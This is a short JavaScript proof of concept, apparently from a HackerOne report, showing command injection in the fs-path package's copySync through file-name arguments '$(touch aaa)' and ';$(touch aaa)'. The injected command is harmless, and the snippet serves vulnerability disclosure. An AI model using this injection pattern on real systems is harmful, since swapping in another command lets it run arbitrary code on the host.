//https://hackerone.com/reports/324491
const fsPath = require("fs-path");
const source = "$(touch aaa)";
const target = ";$(touch aaa)";
fsPath.copySync(source, target);
